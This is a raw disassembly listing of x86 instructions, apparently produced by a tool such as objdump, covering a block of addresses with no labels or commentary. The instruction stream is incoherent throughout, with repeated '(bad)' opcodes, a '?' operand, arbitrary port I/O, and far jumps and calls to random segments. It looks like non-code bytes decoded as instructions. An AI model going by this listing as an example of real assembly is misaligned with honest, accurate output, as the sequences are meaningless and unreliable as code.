  41b0cd:	xchg   BYTE PTR [esi-0x62],bl
  41b0d0:	mov    ch,0xa0
  41b0d2:	test   ah,dh
  41b0d4:	fs sahf 
  41b0d6:	sub    BYTE PTR [esi+0x175bbd36],0xf0
  41b0dd:	stc    
	...
  41b0ea:	add    BYTE PTR [edi+eiz*4],bh
  41b0ed:	dec    esp
  41b0ee:	push   esi
  41b0ef:	(bad)  
  41b0f1:	ds out dx,eax
  41b0f3:	dec    edi
  41b0f4:	pop    ebp
  41b0f5:	imul   ebx,DWORD PTR ds:0xeccbc93f,0x16a59
  41b0ff:	sub    eax,DWORD PTR [edx]
  41b101:	add    BYTE PTR [eax],al
  41b103:	cwde   
  41b104:	stos   BYTE PTR es:[edi],al
  41b105:	mov    ds:0x128b99db,eax
  41b10a:	call   0x2c4b:0xb445b6ab
  41b111:	pop    eax
  41b112:	test   eax,0x84c3497b
  41b117:	dec    ebp
  41b118:	mov    dh,0xd6
  41b11a:	int3   
  41b11b:	xor    DWORD PTR [edi],0xffffffad
  41b11e:	in     eax,0x52
  41b120:	mov    ch,0x7c
  41b122:	sub    ecx,ebp
  41b124:	aad    0xda
  41b126:	xor    DWORD PTR [ecx],eax
  41b128:	jecxz  0x41b0f4
  41b12a:	sub    BYTE PTR [ebp+edx*1+0x1b48a0f3],bh
  41b131:	mov    eax,ds:0x3b5cf906
  41b136:	or     cl,BYTE PTR [eax+0x7a]
  41b139:	lock and esp,DWORD PTR ss:[esi+ebp*2]
  41b13e:	pop    ds
  41b13f:	adc    BYTE PTR [ebx],0x84
  41b142:	loopne 0x41b13a
  41b144:	mov    DWORD PTR [esp+edx*1-0x9],ebx
  41b148:	js     0x41b1ae
  41b14a:	call   0x3925:0xc7478f12
  41b151:	pcmpgtw mm3,QWORD PTR [ecx-0x5af7c6d4]
  41b158:	pop    ebp
  41b159:	jp     0x41b10e
  41b15b:	mov    bl,0x8
  41b15d:	idiv   BYTE PTR [ebx-0xc5dd696]
  41b163:	nop
  41b164:	push   ss
  41b165:	mov    al,ds:0xcfb19c3a
  41b16a:	fwait
  41b16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b16c:	push   esp
  41b16d:	xchg   ebx,eax
  41b16e:	cmc    
  41b16f:	push   0x7633b106
  41b174:	icebp  
  41b175:	and    al,0x2f
  41b177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b178:	jl     0x41b14a
  41b17a:	dec    eax
  41b17b:	rcl    BYTE PTR [ecx-0x23cb1a14],0x1b
  41b182:	add    DWORD PTR [edx-0x29],edi
  41b185:	test   BYTE PTR [esi+ebx*2],ah
  41b188:	stos   DWORD PTR es:[edi],eax
  41b189:	jae    0x41b11d
  41b18b:	dec    ecx
  41b18c:	outs   dx,DWORD PTR ds:[esi]
  41b18d:	mov    ebp,0x1a266c7f
  41b192:	mov    WORD PTR [ebx-0x58f1524],ss
  41b198:	out    0xd8,eax
  41b19a:	sahf   
  41b19b:	jle    0x41b170
  41b19d:	stc    
  41b19e:	mov    BYTE PTR [edi],cl
  41b1a0:	test   BYTE PTR [edi-0x78],ah
  41b1a3:	imul   esi,DWORD PTR [edx+0x2c8885ee],0x35c239d1
  41b1ad:	out    0x9e,eax
  41b1af:	mov    ebp,0x8e6a2e55
  41b1b4:	mov    ebp,0xedd3cb72
  41b1b9:	add    BYTE PTR [edx-0x423e46cd],bl
  41b1bf:	push   0xffffffcb
  41b1c1:	push   esi
  41b1c2:	aaa    
  41b1c3:	cs dec edi
  41b1c5:	pop    ebp
  41b1c6:	push   edx
  41b1c7:	ret    0x3405
  41b1ca:	in     al,dx
  41b1cb:	lods   al,BYTE PTR ds:[esi]
  41b1cc:	and    edx,ebx
  41b1ce:	ret    
  41b1cf:	jno    0x41b1aa
  41b1d1:	add    dl,BYTE PTR [eax-0x8101c90]
  41b1d7:	daa    
  41b1d8:	repnz mov dh,0x99
  41b1db:	fs cmc 
  41b1dd:	mov    ds:0xf686a86c,al
  41b1e2:	mov    ds:0xb5f4691,eax
  41b1e7:	iret   
  41b1e8:	jge    0x41b16e
  41b1ea:	(bad)  
  41b1eb:	loope  0x41b180
  41b1ed:	mov    ah,BYTE PTR [ebp-0x38c284af]
  41b1f3:	mov    bh,0x5e
  41b1f5:	inc    edx
  41b1f6:	aas    
  41b1f7:	pusha  
  41b1f8:	cmp    al,0x1f
  41b1fa:	test   eax,0xbddcdb0
  41b1ff:	dec    esp
  41b200:	test   eax,0x7933fbfc
  41b205:	int    0x85
  41b207:	(bad)  
  41b209:	sbb    al,0x61
  41b20b:	mov    eax,ds:0xeef51142
  41b210:	ins    DWORD PTR es:[edi],dx
  41b211:	jecxz  0x41b20c
  41b213:	test   al,0xbc
  41b215:	arpl   WORD PTR [ecx+esi*2-0x4d23ac20],bx
  41b21c:	out    dx,eax
  41b21d:	jno    0x41b267
  41b21f:	bnd ja 0x41b24f
  41b222:	xchg   ecx,eax
  41b223:	lahf   
  41b224:	add    al,0x29
  41b226:	sbb    dh,BYTE PTR [ebx]
  41b228:	loope  0x41b22b
  41b22a:	inc    eax
  41b22b:	jmp    0x274148f8
  41b230:	je     0x41b1cb
  41b232:	jge    0x41b24f
  41b234:	push   edx
  41b235:	imul   esp,DWORD PTR [edx+esi*4],0xfffffff2
  41b239:	or     eax,DWORD PTR ds:[ebp+0x30]
  41b23d:	loop   0x41b203
  41b23f:	dec    esi
  41b240:	lods   al,BYTE PTR ds:[esi]
  41b241:	mov    BYTE PTR [esi],ah
  41b243:	mov    edx,DWORD PTR [eax+0x4f]
  41b246:	jge    0x41b1ed
  41b248:	inc    ebx
  41b249:	adc    al,0x44
  41b24b:	pop    ebx
  41b24c:	ret    0x6e87
  41b24f:	out    dx,al
  41b250:	push   es
  41b251:	pop    ds
  41b252:	neg    DWORD PTR [edx+esi*2]
  41b255:	lods   eax,DWORD PTR ds:[esi]
  41b256:	fst    DWORD PTR [esi]
  41b258:	mov    ebx,0xe1b2ff0b
  41b25d:	outs   dx,BYTE PTR ds:[esi]
  41b25e:	mov    dh,0xdb
  41b260:	out    dx,al
  41b261:	push   ecx
  41b262:	add    ecx,DWORD PTR [edx-0x50827b0]
  41b268:	cwde   
  41b269:	mov    bl,0xbd
  41b26b:	sbb    edi,DWORD PTR [esi]
  41b26d:	dec    ebp
  41b26e:	pop    edi
  41b26f:	nop
  41b270:	addr16 cmc 
  41b272:	lea    esi,[esi-0x6819c8]
  41b278:	outs   dx,DWORD PTR ds:[esi]
  41b279:	xchg   DWORD PTR [esi+0x33],eax
  41b27c:	sub    BYTE PTR [ebx],dl
  41b27e:	sbb    eax,0x75731991
  41b283:	adc    BYTE PTR [edi-0x7ab0de6f],dh
  41b289:	push   edx
  41b28a:	inc    ebx
  41b28b:	sub    esp,DWORD PTR [edx+0x336262f1]
  41b291:	inc    esp
  41b292:	cmp    esi,DWORD PTR [ebx-0x19f0965e]
  41b298:	inc    eax
  41b299:	ret    0x7d12
  41b29c:	out    dx,al
  41b29d:	into   
  41b29e:	aam    0x78
  41b2a0:	lock test DWORD PTR [esi-0x1eb7d034],ebp
  41b2a7:	aas    
  41b2a8:	xchg   edx,eax
  41b2a9:	cmp    BYTE PTR [ebp+0x3c5687eb],0xb0
  41b2b0:	daa    
  41b2b1:	xor    BYTE PTR [edx-0x6b],al
  41b2b4:	cmp    al,0x44
  41b2b6:	or     BYTE PTR [edi],dh
  41b2b8:	add    eax,0xa186fdd1
  41b2bd:	repnz xchg ebx,ecx
  41b2c0:	(bad)  
  41b2c1:	out    0xbb,eax
  41b2c3:	mov    ah,ah
  41b2c5:	xchg   cl,dh
  41b2c7:	mov    esi,0x11dcfb25
  41b2cc:	imul   ebx,DWORD PTR [esi+0xca377a6],0xd6b8c91a
  41b2d6:	xlat   BYTE PTR ds:[ebx]
  41b2d7:	shr    DWORD PTR [edi-0x7b966b52],cl
  41b2dd:	addr16 xor esp,esp
  41b2e0:	and    eax,0xf3cdf961
  41b2e5:	cmp    bl,BYTE PTR [eax+eiz*8-0x54]
  41b2e9:	jp     0x41b27d
  41b2eb:	mov    ch,0x53
  41b2ed:	xchg   ebx,eax
  41b2ee:	push   es
  41b2ef:	push   0xe4fd9dc0
  41b2f4:	add    BYTE PTR ds:0x820dada1,ch
  41b2fa:	sub    al,0x59
  41b2fc:	leave  
  41b2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2fe:	pop    ds
  41b2ff:	xor    ebx,DWORD PTR [eax-0x7b]
  41b302:	push   esi
  41b303:	pop    esi
  41b304:	je     0x41b378
  41b306:	push   ss
  41b307:	xchg   esp,ebp
  41b309:	sub    esp,DWORD PTR [ebx+0x242b324f]
  41b30f:	pop    ecx
  41b310:	or     eax,0x27248e87
  41b315:	test   BYTE PTR [eax+ebp*1+0x2c94bb07],al
  41b31c:	enter  0xbaef,0x33
  41b320:	inc    ecx
  41b321:	adc    BYTE PTR [ebp-0x6dceeb37],0xef
  41b328:	dec    eax
  41b329:	jb     0x41b35e
  41b32b:	aaa    
  41b32c:	test   DWORD PTR [edx+0x0],ecx
	...
  41b33b:	mov    edi,0x7fd45490
  41b340:	aam    0xbf
  41b342:	sti    
  41b343:	leave  
  41b344:	mov    ebx,0x65065f0
  41b349:	pop    eax
  41b34a:	out    0x84,eax
  41b34c:	ins    BYTE PTR es:[edi],dx
  41b34d:	add    DWORD PTR [eax],eax
  41b34f:	sub    eax,DWORD PTR [edx]
  41b351:	add    BYTE PTR [eax],al
  41b353:	add    eax,DWORD PTR [edi-0x24]
  41b356:	int3   
  41b357:	mov    edx,esi
  41b359:	pop    eax
  41b35a:	test   BYTE PTR [ecx+0x5d],0x23
  41b35e:	push   ds
  41b35f:	cmp    eax,0xafcb9b4
  41b364:	shr    BYTE PTR [ebx+0x7b],0x89
  41b368:	sub    eax,DWORD PTR [edx]
  41b36a:	add    ch,BYTE PTR [edx]
  41b36c:	test   eax,0x9d8f76d4
  41b371:	mov    bl,0x77
  41b373:	outs   dx,DWORD PTR ds:[esi]
  41b374:	scas   eax,DWORD PTR es:[edi]
  41b375:	leave  
  41b376:	addr16 popa 
  41b378:	adc    eax,0x2776ee42
  41b37d:	mov    esp,0xb2ef5156
  41b382:	call   0x75f18c00
  41b387:	xchg   edx,eax
  41b388:	pop    ebp
  41b389:	or     DWORD PTR es:[ecx],edi
  41b38c:	out    0x26,eax
  41b38e:	les    esi,FWORD PTR [ecx-0x395fda40]
  41b394:	mov    al,0x9f
  41b396:	xor    DWORD PTR [edi+eiz*1+0xf],ecx
  41b39a:	or     BYTE PTR [ecx-0x6741c75e],al
  41b3a0:	mov    bl,0xde
  41b3a2:	push   edi
  41b3a3:	adc    DWORD PTR [esi+0x4e],esi
  41b3a6:	popa   
  41b3a7:	xor    al,0xb1
  41b3a9:	or     dh,BYTE PTR [ecx]
  41b3ab:	inc    ecx
  41b3ac:	push   cs
  41b3ad:	cmp    eax,0x1a646b06
  41b3b2:	lds    edi,FWORD PTR [ecx-0x1545b168]
  41b3b8:	aad    0xbb
  41b3ba:	shr    DWORD PTR [edi+0x27c51688],0x59
  41b3c1:	adc    cl,bh
  41b3c3:	sar    DWORD PTR [edi-0x6019e8d7],cl
  41b3c9:	inc    ebp
  41b3ca:	sub    edi,DWORD PTR [ebx]
  41b3cc:	enter  0x838b,0x47
  41b3d0:	ffree  st(2)
  41b3d2:	sahf   
  41b3d3:	sbb    ebp,DWORD PTR [ebp-0x6a]
  41b3d6:	fwait
  41b3d7:	into   
  41b3d8:	cmp    BYTE PTR [edi],dl
  41b3da:	push   eax
  41b3db:	cs mov ebp,0xac54bd7f
  41b3e1:	ins    DWORD PTR es:[edi],dx
  41b3e2:	sub    ah,bh
  41b3e4:	ret    
  41b3e5:	cvtps2pi mm7,QWORD PTR [edi]
  41b3e8:	dec    esp
  41b3e9:	ja     0x41b425
  41b3eb:	push   edx
  41b3ec:	and    al,0xc8
  41b3ee:	fnstsw WORD PTR ds:0xb1b8a916
  41b3f4:	lar    ebx,WORD PTR [ecx+0x6d]
  41b3f8:	dec    edi
  41b3f9:	xor    esi,DWORD PTR [edx+eiz*4+0x7a]
  41b3fd:	aam    0xfe
  41b3ff:	cmp    eax,ebp
  41b401:	jle    0x41b46a
  41b403:	or     eax,0x79cedf6e
  41b408:	sbb    ah,BYTE PTR [eax+eiz*1+0x1f]
  41b40c:	out    dx,al
  41b40d:	retf   
  41b40e:	test   BYTE PTR [ecx+0x8498e94],bh
  41b414:	or     al,0x40
  41b416:	mov    al,ds:0xb1393d60
  41b41b:	test   eax,0x663a5543
  41b420:	push   edx
  41b421:	imul   esi,DWORD PTR [ebx+0x751d191d],0x33
  41b428:	pop    ds
  41b429:	push   0x84616fb2
  41b42e:	imul   ecx,DWORD PTR [ecx+0x1cc276f4],0xffffff92
  41b435:	jge    0x41b411
  41b437:	test   ebx,ecx
  41b439:	xchg   ebx,eax
  41b43a:	sub    edi,ecx
  41b43c:	jns    0x41b469
  41b43e:	ja     0x41b459
  41b440:	popf   
  41b441:	xor    edi,DWORD PTR ds:0x322d9ce1
  41b447:	shl    BYTE PTR [esi],1
  41b449:	xor    eax,0xf2406a14
  41b44e:	aaa    
  41b44f:	push   ebx
  41b450:	pop    es
  41b451:	jne    0x41b47f
  41b453:	test   bh,al
  41b455:	jmp    0x84361f81
  41b45a:	mov    BYTE PTR [edi],bl
  41b45c:	dec    edx
  41b45d:	sbb    eax,0xb1cae24f
  41b462:	(bad)  
  41b463:	pop    ds
  41b464:	pop    ds
  41b465:	mov    eax,0xfb57a461
  41b46a:	xor    al,0xe7
  41b46c:	xor    DWORD PTR [ebp+0x4a1cb4d6],ebp
  41b472:	sahf   
  41b473:	fsub   QWORD PTR [esi+0x5fb393bf]
  41b479:	or     edx,DWORD PTR [edx+ebp*4]
  41b47c:	pop    ss
  41b47d:	pop    edx
  41b47e:	jne    0x41b45a
  41b480:	mov    edi,0xc0c9651e
  41b485:	pop    ss
  41b486:	es xchg ebp,eax
  41b488:	or     DWORD PTR [ecx],eax
  41b48a:	or     al,0xcb
  41b48c:	or     DWORD PTR [ebx+0x2c2cf16],ecx
  41b492:	jmp    0x851415b6
  41b497:	cmc    
  41b498:	in     al,dx
  41b499:	xor    eax,ebp
  41b49b:	mov    bh,0x56
  41b49d:	sahf   
  41b49e:	pop    edx
  41b49f:	ja     0x41b49b
  41b4a1:	shr    DWORD PTR [ecx+0x6a],cl
  41b4a4:	test   eax,0x86509c74
  41b4a9:	jmp    0x41b50e
  41b4ab:	or     BYTE PTR [edi-0x77],0xd1
  41b4af:	dec    edi
  41b4b0:	add    ah,BYTE PTR [ecx+edx*1]
  41b4b3:	ror    DWORD PTR [ebx+0x57e8a6e5],0x99
  41b4ba:	cld    
  41b4bb:	(bad)  
  41b4bc:	nop
  41b4bd:	jmp    0x613c:0x47f87a56
  41b4c4:	shr    dh,0xa7
  41b4c7:	pop    esp
  41b4c8:	retf   
  41b4c9:	cmp    al,0x2f
  41b4cb:	push   edx
  41b4cc:	repz sbb BYTE PTR [edi-0x2eb12383],ch
  41b4d3:	xor    eax,0xb34d96dc
  41b4d8:	jle    0x41b554
  41b4da:	bound  ebx,QWORD PTR [ebx]
  41b4dc:	dec    eax
  41b4dd:	jle    0x41b4ca
  41b4df:	or     BYTE PTR [ebx-0x73],cl
  41b4e2:	aad    0x6f
  41b4e4:	pop    edi
  41b4e5:	retf   
  41b4e6:	dec    esp
  41b4e7:	and    ebp,ecx
  41b4e9:	iret   
  41b4ea:	add    DWORD PTR [edx],edx
  41b4ec:	add    esi,ecx
  41b4ee:	push   esp
  41b4ef:	mov    eax,0x8c2bba35
  41b4f4:	shl    BYTE PTR [edx-0x4f7f9b76],cl
  41b4fa:	aaa    
  41b4fb:	mov    ebp,ebp
  41b4fd:	push   ebp
  41b4fe:	jo     0x41b4bd
  41b500:	aaa    
  41b501:	pushf  
  41b502:	int    0x4d
  41b504:	mov    ch,0xdb
  41b506:	vpsrlq xmm3,xmm1,XMMWORD PTR [ebx+0x45]
  41b50b:	sbb    DWORD PTR [ecx-0x23],esp
  41b50e:	push   es
  41b50f:	cdq    
  41b510:	aam    0x72
  41b512:	lahf   
  41b513:	fisttp QWORD PTR [esi-0x54ff6f5e]
  41b519:	js     0x41b4dc
  41b51b:	int3   
  41b51c:	jne    0x41b565
  41b51e:	pop    edi
  41b51f:	pop    es
  41b520:	mov    edi,0x6cd8bc5a
  41b525:	js     0x41b58d
  41b527:	in     eax,0x37
  41b529:	or     BYTE PTR [ebx-0x4c6d1852],bh
  41b52f:	stos   BYTE PTR es:[edi],al
  41b530:	(bad)  
  41b531:	nop
  41b532:	fld    QWORD PTR [ecx-0x7e6ad249]
  41b538:	mov    edi,0x281fadc0
  41b53d:	push   es
  41b53e:	call   0x4d1390ec
  41b543:	dec    edx
  41b544:	cmp    eax,0x8d30d48e
  41b549:	ret    0x15ec
  41b54c:	test   DWORD PTR [edx+0x4b],0x18e4d495
  41b553:	scas   al,BYTE PTR es:[edi]
  41b554:	rcl    DWORD PTR [edx-0x55b2dbe6],cl
  41b55a:	out    0xe9,al
  41b55c:	mov    ecx,0x107a6b1f
  41b561:	iret   
  41b562:	mov    al,0xc5
  41b564:	stos   DWORD PTR es:[edi],eax
  41b565:	and    ecx,DWORD PTR [esi+0x5d]
  41b568:	mov    al,0x16
  41b56a:	fcmovb st,st(3)
  41b56c:	xor    DWORD PTR [esi+0xe4ef67c],esi
  41b572:	call   0xa55a:0xa33ad6fc
  41b579:	push   cs
  41b57a:	retf   
  41b57b:	fimul  DWORD PTR [eax]
  41b57d:	add    BYTE PTR [bx+si],al
	...
  41b588:	add    BYTE PTR [eax],al
  41b58a:	add    BYTE PTR [edx-0x6cad99],cl
  41b590:	mov    bh,0xcb
  41b592:	jg     0x41b545
  41b594:	xchg   BYTE PTR [ebp+0x1c],ch
  41b597:	mov    ebx,0xaf53eb7a
  41b59c:	outs   dx,BYTE PTR ds:[esi]
  41b59d:	add    DWORD PTR [eax],eax
  41b59f:	sub    eax,DWORD PTR [edx]
  41b5a1:	add    BYTE PTR [eax],al
  41b5a3:	inc    edx
  41b5a4:	adc    DWORD PTR [eax-0x15],ecx
  41b5a7:	lahf   
  41b5a8:	out    dx,eax
  41b5a9:	add    dh,BYTE PTR [ecx]
  41b5ab:	push   0x22
  41b5ad:	(bad)  
  41b5ae:	loop   0x41b5af
  41b5b0:	fcmovb st,st(2)
  41b5b2:	mov    bl,0xf
  41b5b4:	in     al,0x8e
  41b5b6:	add    edx,DWORD PTR [edi+ebp*2-0x1d]
  41b5ba:	add    al,0xfe
  41b5bc:	out    0xd8,eax
  41b5be:	mov    bh,0xcd
  41b5c0:	fisttp QWORD PTR [eax]
  41b5c2:	jle    0x41b544
  41b5c4:	neg    DWORD PTR [ebx]
  41b5c6:	inc    ebp
  41b5c7:	(bad)  
  41b5c8:	outs   dx,BYTE PTR ds:[esi]
  41b5c9:	or     cl,BYTE PTR [esi+0x6a83eb0d]
  41b5cf:	jge    0x41b561
  41b5d1:	outs   dx,DWORD PTR ds:[esi]
  41b5d2:	in     eax,dx
  41b5d3:	aam    0xc7
  41b5d5:	add    al,0x80
  41b5d7:	sub    ch,ch
  41b5d9:	(bad)  
  41b5da:	sbb    dl,ch
  41b5dc:	fstp   TBYTE PTR [ebx+0x2cd6f7a7]
  41b5e2:	sub    ebx,esi
  41b5e4:	pop    esp
  41b5e5:	es retf 0x937d
  41b5e9:	dec    esi
  41b5ea:	xlat   BYTE PTR ds:[ebx]
  41b5eb:	addr16 and eax,0xca458722
  41b5f1:	fistp  DWORD PTR [edx+eiz*8-0x4a09707b]
  41b5f8:	or     dl,BYTE PTR [edi+0x1d]
  41b5fb:	push   ds
  41b5fc:	bound  ebx,QWORD PTR [ecx-0x8cd8b41]
  41b602:	test   DWORD PTR [edi-0x2d],ecx
  41b605:	jecxz  0x41b65e
  41b607:	sar    BYTE PTR [edi],0xe4
  41b60a:	pop    edx
  41b60b:	and    BYTE PTR [edx+esi*2+0x44f3dbd],bl
  41b612:	add    bl,BYTE PTR [edi]
  41b614:	fmul   DWORD PTR [edi]
  41b616:	push   0xe854ee0c
  41b61b:	push   ebx
  41b61c:	out    0xb2,al
  41b61e:	jmp    FWORD PTR [eiz*8+0x2808b1e1]
  41b625:	stc    
  41b626:	mov    ch,0x91
  41b628:	pop    ebp
  41b629:	mov    cl,0xe
  41b62b:	push   ds
  41b62c:	daa    
  41b62d:	stc    
  41b62e:	mov    ebx,0xdff12382
  41b633:	test   DWORD PTR [ecx-0x31],0x3e9953c6
  41b63a:	mov    cl,0xa8
  41b63c:	std    
  41b63d:	xchg   ebp,eax
  41b63e:	lds    edi,FWORD PTR [ebx+eax*2]
  41b641:	jle    0x41b67e
  41b643:	push   0x18
  41b645:	cmp    BYTE PTR [ebx+0xd],ah
  41b648:	cmp    al,BYTE PTR [esi+eax*1-0x76]
  41b64c:	mov    edx,0x3f73010
  41b651:	sahf   
  41b652:	out    0x41,eax
  41b654:	push   0x80c7015
  41b659:	mov    dh,0x56
  41b65b:	and    eax,ebp
  41b65d:	arpl   WORD PTR [ebp+0x3f],cx
  41b660:	ret    0xcad8
  41b663:	mov    bh,dl
  41b665:	nop
  41b666:	cs push edx
  41b668:	push   eax
  41b669:	shl    eax,1
  41b66b:	mov    bh,0xc0
  41b66d:	pop    eax
  41b66e:	out    0xb7,al
  41b670:	shl    DWORD PTR [edx],cl
  41b672:	jle    0x41b644
  41b674:	popa   
  41b675:	mov    dl,0x71
  41b677:	mov    ?,WORD PTR [esi-0x1e]
  41b67a:	loop   0x41b625
  41b67c:	add    al,0x6
  41b67e:	jae    0x41b6b4
  41b680:	sahf   
  41b681:	jl     0x41b618
  41b683:	das    
  41b684:	mov    edi,0x81707d96
  41b689:	int3   
  41b68a:	ss xchg ebp,eax
  41b68c:	inc    ebp
  41b68d:	enter  0x75c6,0x9d
  41b691:	or     BYTE PTR [edx+0x70],bh
  41b694:	pop    ds
  41b695:	pop    es
  41b696:	adc    al,0xda
  41b698:	out    dx,eax
  41b699:	out    dx,al
  41b69a:	in     al,0x43
  41b69c:	xor    al,0x68
  41b69e:	xchg   ebx,eax
  41b69f:	sti    
  41b6a0:	adc    al,0x41
  41b6a2:	shr    ch,cl
  41b6a4:	dec    ebp
  41b6a5:	push   0xda82a63c
  41b6aa:	dec    edi
  41b6ab:	mov    BYTE PTR [ecx+ebx*2],ah
  41b6ae:	pop    ss
  41b6af:	dec    ebx
  41b6b0:	or     BYTE PTR [edi-0x78],bl
  41b6b3:	inc    ebp
  41b6b4:	call   0xe92d:0xd9a0fddf
  41b6bb:	sub    bl,0x4
  41b6be:	shl    ebx,1
  41b6c0:	cmp    edx,esp
  41b6c2:	das    
  41b6c3:	jecxz  0x41b656
  41b6c5:	adc    eax,0x17a6da2b
  41b6ca:	loopne 0x41b716
  41b6cc:	and    eax,0x2a606a9c
  41b6d1:	mov    ds:0x46f0118b,eax
  41b6d6:	(bad)  
  41b6d7:	std    
  41b6d8:	jge    0x41b677
  41b6da:	cmp    eax,0xf5456f6e
  41b6df:	loope  0x41b74a
  41b6e1:	mov    bl,0xae
  41b6e3:	rol    DWORD PTR [edi-0x226b39b7],1
  41b6e9:	(bad)  
  41b6ea:	mov    edx,DWORD PTR [edi-0x3c]
  41b6ed:	add    DWORD PTR [ebx+ecx*1],ecx
  41b6f0:	xor    esi,DWORD PTR [ebp+0x57375960]
  41b6f6:	int    0xa7
  41b6f8:	jbe    0x41b69a
  41b6fa:	jl     0x41b6d1
  41b6fc:	mov    ch,0x3f
  41b6fe:	imul   eax,edx,0x2b729dbf
  41b704:	cdq    
  41b705:	mov    ds:0x851c877d,eax
  41b70a:	push   es
  41b70b:	cli    
  41b70c:	clc    
  41b70d:	paddb  mm2,mm5
  41b710:	neg    bl
  41b712:	xchg   ecx,eax
  41b713:	or     al,0xe8
  41b715:	dec    ebp
  41b716:	cmp    eax,0x87a6b4f3
  41b71b:	push   0x43
  41b71d:	sub    dh,BYTE PTR [edx+0x76]
  41b720:	pop    esi
  41b721:	or     BYTE PTR [esi],al
  41b723:	jne    0x41b6c6
  41b725:	mov    ebx,0x5ca2151a
  41b72a:	stc    
  41b72b:	jecxz  0x41b797
  41b72d:	addr16 faddp st(0),st
  41b730:	pop    esp
  41b731:	fadd   DWORD PTR [ebp+0x2a83a127]
  41b737:	adc    ebp,DWORD PTR [esi]
  41b739:	sub    esi,DWORD PTR [eax]
  41b73b:	and    eax,DWORD PTR [eax+edx*1]
  41b73e:	and    dh,BYTE PTR [edx+ebp*8+0x57]
  41b742:	mov    eax,esp
  41b744:	inc    ebp
  41b745:	jmp    0xbc0f:0xab4ae689
  41b74c:	or     DWORD PTR [ebp+0x47],eax
  41b74f:	std    
  41b750:	lahf   
  41b751:	dec    ebx
  41b752:	sar    esp,cl
  41b754:	les    esp,FWORD PTR [ecx+eax*4-0x2b14cdcf]
  41b75b:	mov    ebx,0xba7dc8ac
  41b760:	lahf   
  41b761:	data16 jle 0x41b711
  41b764:	mov    ecx,0x1edae839
  41b769:	lods   al,BYTE PTR ds:[esi]
  41b76a:	dec    ebx
  41b76b:	pop    ds
  41b76c:	xchg   BYTE PTR [ebp+0x63aa43e7],ah
  41b772:	pop    esp
  41b773:	jbe    0x41b732
  41b775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b776:	push   es
  41b777:	add    al,0x3f
  41b779:	scas   al,BYTE PTR es:[edi]
  41b77a:	adc    ch,bh
  41b77c:	sbb    al,BYTE PTR fs:[edx-0x27]
  41b780:	add    ch,bh
  41b782:	in     eax,0x4f
  41b784:	shl    BYTE PTR [ebp-0x59],cl
  41b787:	scas   eax,DWORD PTR es:[edi]
  41b788:	ret    
  41b789:	scas   eax,DWORD PTR es:[edi]
  41b78a:	(bad)  
  41b78b:	dec    ebx
  41b78c:	inc    ebp
  41b78d:	mov    dl,0x3b
  41b78f:	and    edx,eax
  41b791:	cmp    DWORD PTR [ebx],ecx
  41b793:	in     al,dx
  41b794:	out    0xa5,eax
  41b796:	dec    esi
  41b797:	jns    0x41b765
  41b799:	fs (bad) 
  41b79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79c:	cmp    cl,BYTE PTR [ecx+0x31151c0a]
  41b7a2:	cmp    DWORD PTR [edi-0x37],esi
  41b7a5:	or     al,0x1c
  41b7a7:	sar    ebp,cl
  41b7a9:	call   DWORD PTR [ebp+ebp*2-0x35739ac8]
  41b7b0:	mov    al,0xe7
  41b7b2:	or     eax,0x3600cdab
  41b7b7:	nop
  41b7b8:	xchg   BYTE PTR [ebx+esi*4+0x1b66c093],cl
  41b7bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7c0:	test   eax,0x7730a752
  41b7c5:	int3   
  41b7c6:	repnz cmp BYTE PTR [esi+0x68ddbd8d],bh
  41b7cd:	xlat   BYTE PTR ds:[ebx]
	...
  41b7da:	add    bh,cl
  41b7dc:	js     0x41b814
  41b7de:	inc    edi
  41b7df:	mov    bh,0x4f
  41b7e1:	(bad)  
  41b7e2:	clc    
  41b7e3:	outs   dx,DWORD PTR ds:[esi]
  41b7e4:	xchg   DWORD PTR [eax],esp
  41b7e6:	cmp    DWORD PTR [ecx-0x15be843b],eax
  41b7ec:	fadd   DWORD PTR [ecx]
  41b7ee:	add    BYTE PTR [ebx],ch
  41b7f0:	add    al,BYTE PTR [eax]
  41b7f2:	add    BYTE PTR [ecx-0x3e68f773],cl
  41b7f8:	add    BYTE PTR [edi],ah
  41b7fa:	ds dec ecx
  41b7fc:	or     bl,BYTE PTR [eax]
  41b7fe:	dec    esi
  41b7ff:	push   ecx
  41b800:	pop    ecx
  41b801:	sbb    ebp,DWORD PTR [edx-0x386dafd4]
  41b807:	jae    0x41b846
  41b809:	sub    al,BYTE PTR [ebx-0x2c]
  41b80c:	xor    ebp,DWORD PTR [edi+0x4a861c73]
  41b812:	sub    BYTE PTR [esi-0x70],bh
  41b815:	gs pop ds
  41b817:	xchg   esp,eax
  41b818:	jnp    0x41b7c8
  41b81a:	loop   0x41b836
  41b81c:	jbe    0x41b813
  41b81e:	fist   DWORD PTR [ebx-0x38]
  41b821:	push   0x8309d63a
  41b826:	pop    ebp
  41b827:	pop    esi
  41b828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b829:	fcomp  QWORD PTR [ebp-0x62d17811]
  41b82f:	add    ch,bl
  41b831:	jg     0x41b82c
  41b833:	mov    bh,0x69
  41b835:	xchg   edi,eax
  41b836:	stos   BYTE PTR es:[edi],al
  41b837:	mov    edi,0x2ceb844a
  41b83c:	rcl    esi,1
  41b83e:	fiadd  WORD PTR [ecx+0x785aa7b4]
  41b844:	adc    ebp,edx
  41b846:	out    0xf4,eax
  41b848:	jo     0x41b83d
  41b84a:	inc    eax
  41b84b:	mov    ecx,0xc619f1c1
  41b850:	inc    ebx
  41b851:	jecxz  0x41b8a1
  41b853:	sbb    ebp,edi
  41b855:	cs fmul st,st(2)
  41b858:	xchg   esi,eax
  41b859:	outs   dx,BYTE PTR ds:[esi]
  41b85a:	sbb    esi,DWORD PTR [edi+edx*8-0x22]
  41b85e:	lock sar BYTE PTR [eax-0x5c],cl
  41b862:	jge    0x41b84d
  41b864:	leave  
  41b865:	clc    
  41b866:	in     eax,dx
  41b867:	call   0xf52a795a
  41b86c:	outs   dx,DWORD PTR ds:[esi]
  41b86d:	add    esi,DWORD PTR [ebp+0x71]
  41b870:	fucomi st,st(2)
  41b872:	mov    ebx,0x27bbdc86
  41b877:	sub    eax,0x15783d07
  41b87c:	sbb    DWORD PTR [eax],0xa3a14c41
  41b882:	cmp    al,0xa8
  41b884:	daa    
  41b885:	inc    edx
